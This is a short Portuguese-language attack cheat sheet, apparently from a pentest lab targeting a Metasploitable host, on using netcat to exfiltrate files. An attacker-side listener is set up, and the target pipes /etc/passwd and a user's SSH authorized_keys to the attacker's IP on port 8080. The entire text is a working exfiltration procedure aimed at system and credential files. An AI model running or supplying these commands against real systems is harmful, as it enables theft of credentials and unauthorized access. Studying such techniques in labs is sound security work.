====Transferindo arquivos via NETCAT:

ATACANTE-No lado servidor, ou seja, o lado que receberá o arquivo execute:
$ nc -lvnp 8080 > passwd.txt 
OBS:para encerrar a captura, interrompa o processo na máquina atacante.

ALVO-No lado do cliente, ou seja o lado que enviará o arquivo, execute:
$ cat /etc/passwd | nc -vn 192.168.80.163 8080

OBS: pode copiar as chave ssh de uma máquina (dentro do usuário .ssh)
#cd /home/msfadmin/
#ls -a (lsta ocultos)
#cat authorized_keys | nc -vn 192.168.80.163 8080
